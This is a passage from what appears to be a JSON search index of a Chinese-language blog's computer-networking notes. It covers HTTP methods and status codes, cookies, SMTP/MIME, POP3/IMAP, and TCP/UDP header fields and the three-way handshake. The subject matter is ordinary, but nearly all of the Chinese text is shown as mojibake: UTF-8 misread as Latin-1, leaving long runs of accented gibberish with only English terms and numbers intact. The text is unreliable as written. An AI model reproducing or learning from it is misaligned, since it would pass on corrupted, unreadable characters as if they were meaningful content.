= 2RTT + æ–‡æ¡£ä¼ é€æ—¶å»¶      ä¸ºå‡å°‘æ—¶å»¶ï¼Œé€šå¸¸ä¼šå»ºç«‹å¤šä¸ªå¹¶è¡ŒTCPåŒæ—¶è¯·æ±‚å¤šä¸ªå¯¹è±¡ï¼›ä½†å ç”¨æœåŠ¡å™¨èµ„æº        æŒç»­è¿æ¥          HTTP / 1.1      åŒä¸€ä¸ªæµè§ˆå™¨ä¸è¯¥æœåŠ¡å™¨çš„TCPè¿æ¥å¯ä»¥ç»§ç»­ä¼ é€è¯·æ±‚å’Œå“åº”      æµæ°´çº¿æ¨¡å¼ï¼šæ”¶åˆ°å“åº”ä¹‹å‰è¿ç»­å‘é€å¤šä¸ªè¯·æ±‚ï¼Œè€ŒåæœåŠ¡å™¨ä¸€ä¸ªæ¥ä¸€ä¸ªå“åº”      éæµæ°´çº¿æ¨¡å¼ï¼šåªæœ‰ä¸Šä¸€ä¸ªè¯·æ±‚è¢«å“åº”åæ‰å¯ä»¥å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚      HTTPæŠ¥æ–‡æ ¼å¼HTTPæ˜¯ é¢å‘æ–‡æœ¬ï¼ŒæŠ¥æ–‡çš„æ¯ä¸€ä¸ªå­—æ®µéƒ½æ˜¯ä¸€äº›ASCIIç ç‡ï¼Œä¸”é•¿åº¦ä¸ç¡®å®šè¯·æ±‚æ ¼å¼ï¼ˆ+å„ç§å­—æ®µï¼‰  è¯·æ±‚è¡Œ          æŒ‡æ˜æ–¹æ³•ï¼šGET POST PUT      èµ„æºåœ°å€ï¼šURL      HTTP ç‰ˆæœ¬        é¦–éƒ¨è¡Œ          Connectï¼šclose â€” å‘Šè¯‰æœåŠ¡å™¨å‘é€å®Œè¯·æ±‚æ–‡æ¡£åå¯é‡Šæ”¾è¿æ¥      User-Agentï¼šMozilla/5.0 â€” å‘Šè¯‰æœåŠ¡å™¨ æµè§ˆå™¨ä½¿ç”¨çš„ç±»å‹å’Œç‰ˆæœ¬      Accept-Languageï¼šcn â€” å‘Šè¯‰æœåŠ¡å™¨ ç”¨æˆ·å¸Œæœ›ä¼˜å…ˆå¾—åˆ°ä¸­æ–‡ç‰ˆæœ¬çš„æ–‡æ¡£                  æ–¹æ³•      æè¿°                  HEAD      è¯·æ±‚URLæ ‡å¿—çš„æ–‡æ¡£é¦–éƒ¨              CONNECT      ç”¨äºä»£ç†æœåŠ¡å™¨              OPTIONS      è¯·æ±‚ä¸€äº›é€‰é¡¹ä¿¡æ¯              TRACE      ç”¨æ¥è¿›è¡Œç¯å›æµ‹è¯•              Â       Â               GET      è¯·æ±‚URLæ ‡å¿—çš„æ–‡æ¡£              POST      å‘æœåŠ¡å™¨å‘é€æ•°æ®              PUT      åœ¨æŒ‡æ˜çš„URLä¸‹å­˜æ¡£ä¸€ä¸ªæ–‡æ¡£              DELETE      åˆ é™¤URLæ ‡å¿—çš„æ–‡æ¡£              PATCH      å¯¹PUTæ–¹æ³•è¡¥å……ï¼Œå¯¹å·²çŸ¥èµ„æºè¿›è¡Œå±€éƒ¨æ›´æ–°      å“åº”ï¼ˆ+å„ç§å­—æ®µï¼‰            çŠ¶æ€ç       ï¼ˆäº”å¤§ç±»ï¼Œ33ç§ï¼‰æè¿°                  1XX      è¡¨ç¤ºé€šçŸ¥ä¿¡æ¯ï¼Œå¦‚ï¼šè¯·æ±‚æ”¶åˆ°äº†ã€æ­£åœ¨è¿›è¡Œå¤„ç†              2XX      è¡¨ç¤ºæˆåŠŸï¼Œå¦‚ï¼šæ¥å—äº†ã€çŸ¥é“äº†              3XX      è¡¨ç¤ºé‡å®šå‘ï¼Œå³è¦å®Œæˆè¯·æ±‚è¿˜å¿…é¡»é‡‡å–è¿›ä¸€æ­¥çš„è¡ŒåŠ¨              4XX      è¡¨ç¤ºå®¢æˆ·çš„å·®é”™ï¼Œå¦‚ï¼šè¯·æ±‚ä¸­æœ‰é”™è¯¯çš„è¯­æ³•ã€æˆ–ä¸èƒ½å®Œæˆ              5XX      è¡¨ç¤ºæœåŠ¡å™¨çš„å·®é”™ï¼Œå¦‚ï¼šæœåŠ¡å™¨å¤±æ•ˆæ— æ³•å®Œæˆè¯·æ±‚      Cookieâ€‹\tHTTPä¸ºæ— çŠ¶æ€åè®®ï¼Œä½¿ç”¨Cookieå¯¹å…¶è¿›è¡ŒçŠ¶æ€åŒ–çš„æŠ€æœ¯  åŒæ–¹å»ºç«‹TCPè¿æ¥æˆåŠŸæ—¶ï¼ŒæœåŠ¡å™¨ä¸ºç”¨æˆ·ç”Ÿæˆå”¯ä¸€çš„cookieè¯†åˆ«ç Set-Cookie  ç”¨æˆ·ç«¯å°†Cookieä¿¡æ¯å­˜æ”¾åˆ°æ–‡æ¡£  æ¯æ¬¡ç”¨æˆ·ç«¯å‘é€è¯·æ±‚ï¼Œè¯»å–Cookieç å¹¶å°†å…¶æºå¸¦ä¸Š  æœåŠ¡å™¨æ ¹æ®Cookieç è¯†åˆ«ç”¨æˆ·ï¼Œå¹¶è¿”å›ä¸ªæ€§åŒ–é¡µé¢HTTPSï¼ˆï¼Ÿ  è¯¦ç»†æ¡æ‰‹è¿‡ç¨‹  æ‘˜è¦ç®—æ³•ã€æ•°å­—ç­¾åã€æ•°å­—è¯ä¹¦çš„åŸç†å’Œè¿‡ç¨‹ç”µå­é‚®ä»¶â€‹\tç”µå­é‚®ä»¶ç³»ç»Ÿä¸Šé‡‡ç”¨ å®¢æˆ·/æœåŠ¡å™¨æ–¹å¼ï¼Œæœ‰ä¸‰ä¸ªéƒ¨ä»¶æ„æˆï¼šç”¨æˆ·ä»£ç†ï¼Œé‚®ä»¶æœåŠ¡å™¨ï¼Œç”µå­é‚®ä»¶æ‰€éœ€çš„åè®®  ç”¨æˆ·ä»£ç†ï¼šç”¨æˆ·ä¸ç”µå­é‚®ä»¶ç³»ç»Ÿçš„æ¥å£ï¼Œåˆç§° ç”µå­é‚®ä»¶å®¢æˆ·ç«¯è½¯ä»¶  é‚®ä»¶æœåŠ¡å™¨ï¼š          ç”µå­é‚®ä»¶ç³»ç»Ÿçš„åŸºç¡€è®¾æ–½ï¼ŒInternetæ‰€æœ‰çš„ISPï¼ˆInternet Service Providerï¼Œäº’è”ç½‘æœåŠ¡æä¾›å•†ï¼‰éƒ½æœ‰é‚®ä»¶æœåŠ¡å™¨      å…¶åŠŸèƒ½æ˜¯å‘é€å’Œæ¥å—é‚®ä»¶ï¼Œç»´æŠ¤ç”¨æˆ·çš„é‚®ç®±        åè®®ï¼šé‚®ä»¶å‘é€åè®®ï¼ˆSMTPï¼‰+é‚®ä»¶è¯»å–åè®®ï¼ˆPOP3ï¼ŒIMAPï¼‰é‚®ä»¶åè®®çš„ä½¿ç”¨èŒƒå›´SMTPSMTP ä¸ MIME  SMTPåè®®          åªèƒ½ä¼ é€ASCIIç æ–‡æœ¬æ•°æ®ï¼Œä¸èƒ½ä¼ é€å¯æ‰§è¡Œæ–‡ä»¶æˆ–å…¶ä»–çš„äºŒè¿›åˆ¶å¯¹è±¡ã€‚      ä¸èƒ½æ»¡è¶³ä¼ é€å¤šåª’ä½“é‚®ä»¶ï¼ˆä¾‹å¦‚å¸¦æœ‰å›¾ç‰‡ã€éŸ³é¢‘æˆ–è§†é¢‘æ•°æ®ï¼‰çš„éœ€è¦ã€‚      è®¸å¤šå…¶ä»–éè‹±è¯­å›½å®¶çš„æ–‡å­—ï¼ˆä¾‹å¦‚ä¸­æ–‡ã€ä¿„æ–‡ã€ç”šè‡³å¸¦æœ‰é‡éŸ³ç¬¦å·çš„æ³•æ–‡æˆ–å¾·æ–‡ï¼‰ä¹Ÿæ— æ³•ç”¨SMTPä¼ é€ã€‚        MIMEï¼ˆå¤šç”¨é€”å› ç‰¹ç½‘é‚®ä»¶æ‰©å±•ï¼ŒMultipurpose Internet Mail Extensionsï¼‰          ä¸ºè§£å†³SMTPä¼ é€éASCIIç æ–‡æœ¬çš„é—®é¢˜ï¼Œ      å¢åŠ äº†5ä¸ªæ–°çš„é‚®ä»¶é¦–éƒ¨å­—æ®µï¼Œè¿™äº›å­—æ®µæä¾›äº†æœ‰å…³é‚®ä»¶ä¸»ä½“çš„ä¿¡æ¯ã€‚      å®šä¹‰äº†è®¸å¤šé‚®ä»¶å†…å®¹çš„æ ¼å¼ï¼Œå¯¹å¤šåª’ä½“ç”µå­é‚®ä»¶çš„è¡¨ç¤ºæ–¹æ³•è¿›è¡Œäº†æ ‡å‡†åŒ–ã€‚      å®šä¹‰äº†ä¼ é€ç¼–ç ï¼Œå¯å¯¹ä»»ä½•å†…å®¹æ ¼å¼è¿›è¡Œè½¬æ¢ï¼Œè€Œä¸ä¼šè¢«é‚®ä»¶ç³»ç»Ÿæ”¹å˜ã€‚      å®é™…ä¸Šï¼ŒMIMEä¸ä»…ä»…ç”¨äºSMTPï¼Œä¹Ÿç”¨äºåæ¥çš„åŒæ ·é¢å‘ASCIIå­—ç¬¦çš„HTTPåŸºæœ¬å·¥ä½œåŸç†ä¿¡æ¯æ ¼å¼é‚®ä»¶è¯»å–åè®®â€‹\téƒ½ä½¿ç”¨åŸºäºTCPè¿æ¥çš„å®¢æˆ·/æœåŠ¡å™¨æ–¹å¼POP é‚®å±€åè®®â€‹\tPost Office Protacolï¼Œæ˜¯Internetçš„æ­£å¼æ ‡å‡†ã€‚  éå¸¸ç®€å•ï¼ŒåŠŸèƒ½æœ‰é™  ç”¨æˆ·åªèƒ½ ä¸‹è½½+åˆ é™¤ã€ä¸‹è½½+ä¿ç•™çš„æ–¹å¼ è·å–é‚®ä»¶åˆ°è®¡ç®—æœº  ä¸å…è®¸ç”¨æˆ·åœ¨é‚®ä»¶æœåŠ¡å™¨ä¸Šç®¡ç†è‡ªå·±çš„é‚®ä»¶  ç†ŸçŸ¥ç«¯å£110IMAP Interneté‚®ä»¶è®¿é—®åè®®â€‹\tInternet Message Access Protocolï¼Œæ˜¯Internetçš„å»ºè®®æ ‡å‡†  åŠŸèƒ½å¼ºå¤§ï¼Œæ˜¯ä¸€ä¸ªè”æœºåè®®  ç”¨æˆ·å¯ä»¥åœ¨è®¡ç®—æœºä¸Šæ“ä½œé‚®ä»¶æœåŠ¡å™¨çš„é‚®ç®±  ç†ŸçŸ¥ç«¯å£143åŸºäºä¸‡ç»´ç½‘çš„ç”µå­é‚®ä»¶â€‹\té€šè¿‡æµè§ˆå™¨ â†’ é‚®ä»¶æœåŠ¡å™¨ä¸‡ç»´ç½‘ï¼Œæ’°å†™ã€æ”¶å‘ã€é˜…è¯»å’Œç®¡ç†ï¼›æ— éœ€å®‰è£…è½¯ä»¶TCP åŒºåˆ†åº”ç”¨è¿›ç¨‹ï¼›å®ç°å¯é ä¼ è¾“æ·»åŠ ETH ä½¿ä¹‹æˆä¸ºï¼ˆä»¥å¤ªç½‘ï¼‰å¸§å¸§ï¼šç›®çš„åœ°å€ + æºåœ°å€ + ç±»å‹ + åŒ… + 4å­—èŠ‚æ ¡éªŒç å‰å¯¼ç ï¼š1å­—èŠ‚å¸§å¼€å§‹ç•Œå®šç¬¦ + 7å­—èŠ‚å‰åŒæ­¥ç  è®©ç›®çš„ä¸»æœºåšå¥½æ¥å—å¸§çš„å‡†å¤‡"
  },
  
  {
    "title": "5. è¿è¾“å±‚",
    "url": "/posts/5.%E8%BF%90%E8%BE%93%E5%B1%82/",
    "categories": "è®¡ç®—æœºç½‘ç»œ",
    "tags": "computerNetwork",
    "date": "2022-06-16 00:00:00 +0800",
    





    
    "snippet": "â€‹\tä¸»æœºåˆ°ä¸»æœºçš„é€šä¿¡ï¼šç‰©ç†å±‚ + æ•°æ®é“¾è·¯å±‚ + ç½‘ç»œå±‚â€‹\tä¸»æœºè¿›ç¨‹é—´çš„é€šä¿¡ï¼šä¼ è¾“å±‚â€‹\tå¦‚æœä¸ºè¿è¡Œåœ¨ä¸åŒä¸»æœºçš„ åº”ç”¨è¿›ç¨‹çš„é€»è¾‘é€šä¿¡æä¾›ç›´æ¥é€šä¿¡æœåŠ¡ï¼Œåˆç§°ä¸ºç«¯åˆ°ç«¯åè®®ï¼ˆç«¯å£ï¼‰â€‹\tå‘ä¸Šå±‚éšè—ä¸‹é¢çš„ç½‘ç»œæœåŠ¡æ ¸å¿ƒç»†èŠ‚ï¼Œæä¾›ä¸¤ç§ä¸åŒçš„è¿è¾“åè®®  é¢å‘è¿æ¥çš„TCP  é¢å‘æ— è¿æ¥UDPç«¯å£å·â€‹\tè¿›ç¨‹æ ‡è¯†ç¬¦PIDï¼Œä¸åŒOSã€ä¸åŒè¿›ç¨‹çš„è¡¨ç¤ºæ ¼å¼ä¸åŒï¼Œä½¿ç”¨ç»Ÿä¸€çš„æ–¹æ³•å¯¹TCP/IPä½“ç³»çš„åº”ç”¨è¿›ç¨‹æ ‡è¯†â€‹\t16bit...",
    "content": "â€‹\tä¸»æœºåˆ°ä¸»æœºçš„é€šä¿¡ï¼šç‰©ç†å±‚ + æ•°æ®é“¾è·¯å±‚ + ç½‘ç»œå±‚â€‹\tä¸»æœºè¿›ç¨‹é—´çš„é€šä¿¡ï¼šä¼ è¾“å±‚â€‹\tå¦‚æœä¸ºè¿è¡Œåœ¨ä¸åŒä¸»æœºçš„ åº”ç”¨è¿›ç¨‹çš„é€»è¾‘é€šä¿¡æä¾›ç›´æ¥é€šä¿¡æœåŠ¡ï¼Œåˆç§°ä¸ºç«¯åˆ°ç«¯åè®®ï¼ˆç«¯å£ï¼‰â€‹\tå‘ä¸Šå±‚éšè—ä¸‹é¢çš„ç½‘ç»œæœåŠ¡æ ¸å¿ƒç»†èŠ‚ï¼Œæä¾›ä¸¤ç§ä¸åŒçš„è¿è¾“åè®®  é¢å‘è¿æ¥çš„TCP  é¢å‘æ— è¿æ¥UDPç«¯å£å·â€‹\tè¿›ç¨‹æ ‡è¯†ç¬¦PIDï¼Œä¸åŒOSã€ä¸åŒè¿›ç¨‹çš„è¡¨ç¤ºæ ¼å¼ä¸åŒï¼Œä½¿ç”¨ç»Ÿä¸€çš„æ–¹æ³•å¯¹TCP/IPä½“ç³»çš„åº”ç”¨è¿›ç¨‹æ ‡è¯†â€‹\t16bitè¡¨ç¤ºï¼Œå–å€¼èŒƒå›´0~65535ï¼›      ç†ŸçŸ¥ç«¯å£å·ï¼š0~1023ï¼›FTP 21/20; HTTP 80; DNS 53        ç™»è®°ç«¯å£å·ï¼š1024~49151ï¼›å¿…é¡»ç™»è®°æ‰‹ç»­        çŸ­æš‚ç«¯å£å·ï¼š49152~65535ï¼›åŠ¨æ€ç«¯å£å·    ã€ç«¯å£å·åªå…·æœ‰æœ¬åœ°æ„ä¹‰ã€‘ä¸åŒOSã€ä¸åŒè¿›ç¨‹çš„ç«¯å£å·ä¹‹é—´æ²¡æœ‰è”ç³»    å¤ç”¨ï¼šå¤šä¸ªçº¿ç¨‹åˆ©ç”¨ä¸€ä¸ª IP+ç«¯å£ å‘é€ä¿¡æ¯ç§°ä¸º å¤ç”¨ï¼›  åˆ†ç”¨ï¼šå¤šä¸ªçº¿ç¨‹åˆ©ç”¨ä¸€ä¸ª IP+ç«¯å£ æ¥æ”¶ä¿¡æ¯æˆä¸º åˆ†ç”¨ï¼›UDPâ€‹\tUser Datagram Protocol ç”¨æˆ·æ•°æ®æŠ¥åè®®  æ— è¿æ¥çš„ â€” æ”¯æŒå•æ’­ã€å¤šæ’­ä»¥åŠå¹¿æ’­  é¢å‘åº”ç”¨æŠ¥æ–‡ï¼š          ä»¥æŠ¥æ–‡ä¸ºå•ä½      å¯¹åº”ç”¨å±‚ä¼ è¾“ä¸‹æ¥çš„æŠ¥æ–‡æ—¢ä¸åˆå¹¶ä¹Ÿä¸æ‹†åˆ†ï¼Œä¿ç•™æŠ¥æ–‡çš„è¾¹ç•Œ        ä¸å¯é æœåŠ¡          è¿è¾“å±‚ã€ç½‘é™…å±‚éƒ½æ˜¯å‘ä¸Šæä¾›æ— è¿æ¥ã€ä¸å¯é çš„ä¼ è¾“æœåŠ¡      å½“æŠ¥æ–‡å‡ºç°è¯¯ç ã€ä¸¢å¤±æ—¶ï¼Œæ¥æ”¶æ–¹ä»…ä¸¢å¼ƒè€Œä»€ä¹ˆéƒ½ä¸åš        é€‚ç”¨äºIPç”µè¯ã€è§†é¢‘ä¼šè®®ã€ç›´æ’­ç­‰å®æ—¶åº”ç”¨æ•°æ®æŠ¥æ ¼å¼â€‹\té¦–éƒ¨ï¼ˆä»…8å­—èŠ‚ï¼‰ + æ•°æ®éƒ¨åˆ†TCPâ€‹\tTransmission Control Protocol ä¼ è¾“æ§åˆ¶åè®®  é¢å‘è¿æ¥ï¼ˆé€»è¾‘ä¸Šçš„è¿æ¥ï¼Œç‰©ç†ä¸Šä»ç„¶æ˜¯æ— è¿æ¥ï¼‰â€” ä»…æ”¯æŒå•æ’­  é¢å‘æ•°æ®æµï¼š          ä¼ é€å­—èŠ‚æµ      ä¸ä¿è¯ä¸€æ¬¡ä¼ å®Œã€åªä¿è¯ä¼ è¾“æ•°æ®ä¸€è‡´ï¼›      è¦æ±‚åº”ç”¨å±‚æœ‰èƒ½åŠ›å¤„ç†ä¹±åºå­—èŠ‚æµã€å¤šæ¬¡ä¼ è¾“çš„æ•°æ®æµæ‹¼æ¥å®Œæ•´è¿˜åŸ        å¯é çš„æœåŠ¡          ç½‘é™…å±‚å¯èƒ½å‡ºç°ä¼ è¾“å·®é”™ï¼Œä½†TCPå¯ä»¥ä½¿å…¶å·®é”™é‡ä¼       ä¸ä¼šå‡ºç°ä¼ è¾“å·®é”™      æ•°æ®æŠ¥æ ¼å¼  æºç«¯å£ã€ç›®çš„ç«¯å£ï¼š          å„16bitï¼Œç”¨äºè¯†åˆ«å‘é€ã€æ¥å—è¯¥TCPæŠ¥æ–‡æ®µçš„åº”ç”¨è¿›ç¨‹      æºç«¯å£ï¼šå¡«å†™æš‚æ—¶ç«¯å£å·ï¼ˆï¼Ÿ      ç›®çš„ç«¯å£ï¼šå¡«å†™è¯¥åº”ç”¨çš„ç†ŸçŸ¥ç«¯å£å·ï¼ˆï¼Ÿ        åºå·ï¼š          32bitï¼Œå¢åŠ åˆ°æœ€åä¸€ä¸ªååˆä»0å¼€å§‹      æŒ‡å‡ºæœ¬TCPæŠ¥æ–‡æ®µæ•°æ®è½½è·çš„ç¬¬ä¸€ä¸ªå­—èŠ‚åºå·        ç¡®è®¤å·ï¼š          32bitï¼Œå¢åŠ åˆ°æœ€åä¸€ä¸ªååˆä»0å¼€å§‹      æŒ‡å‡ºå¸Œæœ›æ”¶åˆ°ä¸‹ä¸€ä¸ªæ•°æ®è½½è·çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·ï¼›å¯¹ä¹‹å‰æ”¶åˆ°çš„æ•°æ®è¿›è¡Œç¡®è®¤ï¼Œæ”¶åˆ°æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚å·+1      ï¼éœ€è¦æ­é… æ ‡å¿—ä½ ACKä½¿ç”¨ï¼š                  ACK=1æ—¶æ‰æœ‰æ•ˆï¼ŒACK=0æ—¶æ— æ•ˆ          TCPè§„å®šï¼Œåœ¨å»ºç«‹è¿æ¥åTCPæŠ¥æ–‡æ®µå¿…é¡»æŠŠ ACK=1                      æ•°æ®åç§»ï¼š          4bitï¼Œä»¥4å­—èŠ‚ä¸ºå•ä½      æŒ‡å‡º æ•°æ®è½½è·çš„èµ·å§‹ è·ç¦» TCPæŠ¥æ–‡æ®µçš„èµ·å§‹ å¤„æœ‰å¤šè¿œ      æŒ‡å‡ºTCPæŠ¥æ–‡çš„é¦–éƒ¨é•¿åº¦                  é¦–éƒ¨å›ºå®šé•¿åº¦ä¸º20å­—èŠ‚ï¼Œæ•°æ®åç§»é‡min = (0101) ~2~ = 5*4          é¦–éƒ¨æœ€å¤§é•¿åº¦ä¸º60å­—èŠ‚ï¼Œæ•°æ®åç§»é‡max = (1111) ~2~ = 15*4                      çª—å£ï¼š          16bitï¼Œä»¥å­—èŠ‚ä¸ºå•ä½      æŒ‡å‡º å‘é€æœ¬æŠ¥æ–‡æ®µçš„ä¸€æ–¹ çš„æ¥å—çª—å£      æ ¹æ®æ¥æ”¶æ–¹çš„æ¥å—èƒ½åŠ› æ§åˆ¶ å‘é€æ–¹çš„å‘é€èƒ½åŠ›ï¼Œå³æµé‡æ§åˆ¶      æ¥æ”¶æ–¹ è®© å‘é€æ–¹ è®¾ç½®å…¶å‘é€çª—å£çš„ä¾æ®ä¹‹ä¸€ï¼š[æ‹¥å¡çª—å£ï¼Œæ¥å—çª—å£]~min~        æ ¡éªŒå’Œ          16bitï¼Œæ£€æŸ¥ TCPæŠ¥æ–‡æ®µçš„é¦–éƒ¨ + æ•°æ®è½½è· ä¸¤ä¸ªéƒ¨åˆ†      æ ¡éªŒæ–¹å¼ä¸UDPä¸€æ ·        æ ‡è¯†ç¬¦          SYNï¼šå»ºç«‹è¿æ¥çš„åŒæ­¥ç¬¦      FINï¼šé‡Šæ”¾è¿æ¥çš„ç»ˆæ­¢ç¬¦      RSTï¼šå¤ä½TCPè¿æ¥                  è¡¨ç¤ºè¿æ¥å‡ºç°å¼‚å¸¸ï¼Œå¿…é¡»é‡Šæ”¾åé‡æ–°å»ºç«‹è¿æ¥          æ‹’ç»éæ³•æŠ¥æ–‡æ®µ ã€ æ‹’ç»æ‰“å¼€ä¸€ä¸ªTCPè¿æ¥                    PSHï¼šæ¨åŠ¨æ ‡å¿—ä½ï¼Œè¯¥æŠ¥æ–‡å°½å¿«æ¨é€ä¸Šäº¤åº”ç”¨è¿›ç¨‹ï¼Œè€Œä¸å¿…ç­‰å¾…æ¥æ”¶ç¼“å­˜å¡«æ»¡å†ä¸Šä¼       URGï¼šç´§æ€¥æ ‡å¿—ä½ï¼Œæ­é… ç´§æ€¥æŒ‡é’ˆä½¿ç”¨                  URG=1ï¼Œç´§æ€¥æŒ‡é’ˆæœ‰æ•ˆï¼›URG=0ï¼Œç´§æ€¥æŒ‡é’ˆæ— æ•ˆ          å‘é€æ–¹æœ‰ç´§æ€¥æ•°æ®æ—¶ï¼Œå¯æ’é˜Ÿåˆ°å‘é€ç¼“å­˜çš„æœ€å‰é¢ï¼Œå¹¶ç«‹å³å°è£…ä¸€ä¸ªTCPæ®µå‘é€          ç´§æ€¥æŒ‡é’ˆï¼šæ•°æ®è½½è·æœ‰å¤šé•¿çš„ç´§æ€¥æ•°æ®ï¼Œç´§æ€¥æ•°æ®ä¹‹åçš„æ™®é€šæ•°æ®          æ¥æ”¶æ–¹æ ¹æ®ç´§æ€¥æŒ‡é’ˆå–å‡ºç´§æ€¥æ•°æ®ï¼Œç›´æ¥ä¸Šäº¤åº”ç”¨è¿›ç¨‹ï¼Œè€Œä¸å¿…ç­‰å¾…æ¥æ”¶ç¼“å­˜å¡«æ»¡å†ä¸Šä¼                       é€‰é¡¹ï¼ˆå¯é€‰ï¼‰          æœ€å¤§æŠ¥æ–‡æ®µé•¿åº¦MSSé€‰é¡¹ï¼šTCPæŠ¥æ–‡çš„æ•°æ®è½½è·æœ€å¤§é•¿åº¦      çª—å£æ‰©å¤§é€‰é¡¹ï¼šä¸ºæ‰©å¤§çª—å£ï¼ˆæé«˜ååç‡ï¼‰      æ—¶é—´æˆ³é€‰é¡¹ï¼š                  è®¡ç®—å¾€è¿”æ—¶é—´RTT          å¤„ç†åºå·è¶…èŒƒå›´æƒ…å†µï¼Œåˆç§°ä¸ºå‡¡æ˜¯åºå·ç»•å›PAWS                    é€‰æ‹©ç¡®è®¤é€‰é¡¹        å¡«å……ï¼šä½¿æ•´ä¸ªé¦–éƒ¨é•¿åº¦èƒ½è¢«4æ•´é™¤ï¼Œæ•°æ®åç§»å­—æ®µä»¥4å­—èŠ‚ä¸ºå•ä½è¿æ¥æ§åˆ¶â€‹\tTCPé¢å‘è¿æ¥ï¼Œä¸‰ä¸ªé˜¶æ®µ  å»ºç«‹è¿æ¥ï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰  æ•°æ®ä¼ é€  é‡Šæ”¾è¿æ¥ï¼ˆå››æ¬¡æŒ¥æ‰‹ï¼‰ä¸‰æ¬¡æ¡æ‰‹ â€” è¿æ¥  è§£å†³é—®é¢˜ï¼š          ç¡®çŸ¥å¯¹æ–¹çš„å­˜åœ¨ï¼Œåå•†å‚æ•°ï¼ˆçª—å£å€¼maxï¼Œæ˜¯å¦ä½¿ç”¨æ—¶é—´æˆ³é€‰é¡¹ä¸€çº§æœåŠ¡è´¨é‡ç­‰ï¼‰      åŒæ–¹å¯¹è¿è¾“å®ä½“èµ„æºï¼ˆç¼“å­˜å¤§å°ã€è¿æ¥è¡¨ä¸­çš„é¡¹ç›®ï¼‰è¿›è¡Œåˆ†é…        åŒæ–¹å…ˆå»ºç«‹ä¼ è¾“æ§åˆ¶å—ï¼š          TCPè¿æ¥è¡¨      æŒ‡é’ˆï¼šå‘é€å’Œç¼“å­˜çš„ã€é‡ä¼ é˜Ÿä¼çš„      å½“å‰å‘é€å’Œæ¥å—çš„åºå·        æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ï¼Œæˆä¸ºè¢«åŠ¨æ‰“å¼€è¿æ¥  å®¢æˆ·ç«¯ä¸»åŠ¨å‘èµ·çš„è¿æ¥ï¼Œç§°ä¸ºä¸»åŠ¨æ‰“å¼€è¿æ¥      ä¸‰æ¬¡æ¡æ‰‹ï¼š    åœ¨ä¸å¯é ç½‘ç»œä¿¡é“ä¸­å»ºç«‹å¯é çš„è¿æ¥                  ä½ å¬è§æˆ‘åœ¨è¯´è¯äº†å—ï¼Ÿï¼ˆå®¢æˆ·ç«¯å‘é€SYN=1,seq=xï¼Œè¿›å…¥SYN-SENTåŒæ­¥å·²å‘é€çŠ¶æ€ï¼‰        ï¼ˆSYN=1ï¼šä¸å…è®¸æºå¸¦æ•°æ®ï¼Œä½†è¦æ¶ˆè€—ä¸€ä¸ªåºå·ï¼›seq=xï¼šå®¢æˆ·ç«¯è¿›ç¨‹æ‰€é€‰æ‹©çš„åˆå§‹åºå·ï¼›ï¼‰                    æˆ‘å¬è§äº†ï¼Œä½ èƒ½å¬è§æˆ‘åœ¨è¯´è¯å—ï¼Ÿï¼ˆæœåŠ¡ç«¯å›å¤SYN=1,ACK=1,seq=y,ack=x+1,è¿›å…¥SYN-RCVDåŒæ­¥å·²æ¥æ”¶çŠ¶æ€ï¼‰        ï¼ˆSYN=1,ACK=1ï¼šTCPè¿æ¥è¯·æ±‚ç¡®è®¤æŠ¥æ–‡ï¼Œä¸å…è®¸æºå¸¦æ•°æ®ï¼Œä½†è¦æ¶ˆè€—ä¸€ä¸ªåºå·ï¼›ï¼‰        ï¼ˆseq=yï¼šæœåŠ¡å™¨è¿›ç¨‹æ‰€é€‰æ‹©çš„åˆå§‹åºå·ï¼›ack=x+1ï¼šå¯¹å®¢æˆ·ç«¯åˆå§‹åºå·ç¡®è®¤ï¼‰                    æˆ‘å¬è§äº†ä½ åœ¨è¯´è¯äº†ï¼ˆå®¢æˆ·ç«¯å›å¤ACK=1,seq=x+1,ack=y+1ï¼Œè¿›å…¥establishè¿æ¥å·²å»ºç«‹çŠ¶æ€ï¼‰        ï¼ˆACK =1ï¼šæ™®é€šçš„ç¡®è®¤æŠ¥æ–‡ï¼›seq=x+1ï¼šè¯·æ±‚è¿æ¥æŠ¥æ–‡å·²æ¶ˆè€—æ‰ä¸€ä¸ªåºå·ï¼›ack=y+1ï¼šå¯¹æœåŠ¡å™¨åˆå§‹åºå·çš„ç¡®è®¤ï¼‰        ï¼ˆTCPè§„å®šï¼šæ™®é€šçš„ç¡®è®¤æŠ¥æ–‡æ®µå¯ä»¥æºå¸¦æ•°æ®ï¼Œå¦‚ä¸æºå¸¦åˆ™ä¸æ¶ˆè€—åºå·ï¼›åˆ™ä¸‹ä¸€ä¸ªæŠ¥æ–‡åºå·ä»ä¸ºx+1ï¼‰                    åŒæ–¹å¼€å§‹é€šè¯ï¼ˆæœåŠ¡å™¨æ”¶åˆ°ç¡®è®¤æŠ¥æ–‡ï¼Œä¹Ÿè¿›å…¥establishé“¾æ¥å·²å»ºç«‹çŠ¶æ€ï¼‰                  ä¸ºä»€ä¹ˆä¸ä½¿ç”¨ä¸¤æ¬¡æ¡æ‰‹ï¼Ÿ    é˜²æ­¢å·²ç»å‡ºé”™çš„è¯·æ±‚æŠ¥æ–‡çªç„¶åˆä¼ ç»™æœåŠ¡å™¨ï¼Œè€Œå¼•èµ·çš„é”™è¯¯                  ä½ å¬åˆ°æˆ‘åœ¨è¯´è¯äº†å—ï¼Ÿï¼ˆå®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡å‘é€SYNï¼Œæ»ç•™æˆ–ä¸¢å¤±ï¼‰                    æ— å›å¤                    ï¼ˆå®¢æˆ·ç«¯é‡æ–°å‘é€SYNåŒ…ï¼‰ä½ å¬åˆ°æˆ‘åœ¨è¯´è¯äº†å—ï¼Ÿ                    æˆ‘å¬è§äº†ï¼Œæˆ‘ä»¬å¼€å§‹èŠå¤©å§ï¼ï¼ˆæœåŠ¡ç«¯æ­£å¸¸æ”¶åˆ°ï¼Œå¹¶å›å¤SYN + ASKï¼‰        ï¼ˆäºŒæ¬¡æ¡æ‰‹æˆåŠŸï¼ŒåŒæ–¹å¼€å§‹å»ºç«‹è¿æ¥ï¼‰                    ç¬¬ä¸€æ¬¡å‘é€çš„SYNçªç„¶æ¢å¤ï¼Œä¼šå‡ºç°ä¸¤ç§æƒ…å†µ                  